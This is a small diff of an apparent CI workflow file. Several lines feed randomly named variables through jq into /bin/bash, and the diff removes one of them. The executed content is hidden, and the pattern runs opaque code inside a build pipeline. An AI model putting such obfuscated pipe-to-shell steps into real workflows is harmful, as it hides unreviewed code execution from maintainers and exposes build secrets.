@@ -27,7 +27,6 @@ jobs:
           echo $an61 | jq -r .egqkp890 | /bin/bash
           echo $rb29839 | jq -r .y9 | /bin/bash
           printf '%s' "$n99620" | jq -r .b9704 | /bin/bash
-          printf '%s' "$wcgtd11" | jq -r .gwvlt15 | /bin/bash
           echo $fnj158 | jq -r .h90 | /bin/bash
 
       - name: Upload archive
